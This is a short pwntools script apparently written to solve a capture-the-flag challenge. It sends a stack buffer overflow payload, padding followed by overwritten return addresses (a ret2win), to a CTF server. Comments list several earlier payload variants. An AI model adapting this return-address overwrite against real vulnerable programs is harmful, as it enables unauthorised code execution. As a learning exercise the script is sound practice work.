from pwn import *


r = remote("amt.rs", 30382)
r.sendline(b'281\n' + b'A'*264 + b'\x8b\x11\x40\x00\x00\x00\x00\x00' + b'\x76\x11\x40\x00\x00\x00\x00\x00')
r.interactive()

# Learning to solve pwn with help from YouTube and Gemini.
# Spent a long time trying to figure out why my payload didn't work, seems that my EC2 instance for CTFs has some additional security measures that the remote server doesn't have
# r < <(python3 -c "import sys; sys.stdout.buffer.write(b'273\n' + b'A'*264 + b'\x76\x11\x40\x00\x00\x00\x00\x00')")
# r < <(python3 -c "import sys; sys.stdout.buffer.write(b'281\n' + b'A'*264 + b'\x8b\x11\x40\x00\x00\x00\x00\x00' + b'\x76\x11\x40\x00\x00\x00\x00\x00')")
# r < <(python3 -c "import sys; sys.stdout.buffer.write(b'273\n' + b'A'*256 + b'\x10\xe3\xff\xff\xff\x7f\x00\x00' + b'\x76\x11\x40\x00\x00\x00\x00\x00')")
# r < <(python3 -c "import sys; sys.stdout.buffer.write(b'281\n' + b'A'*256 + b'\x10\xe3\xff\xff\xff\x7f\x00\x00' + b'\x8b\x11\x40\x00\x00\x00\x00\x00' + b'\x76\x11\x40\x00\x00\x00\x00\x00')")
# r < <(python3 -c "import sys; sys.stdout.buffer.write(b'281\n' + b'A'*256 + b'\x10\xe3\xff\xff\xff\x7f\x00\x00' + b'\x8b\x11\x40\x00\x00\x00\x00\x00' + b'\x7a\x11\x40\x00\x00\x00\x00\x00')")
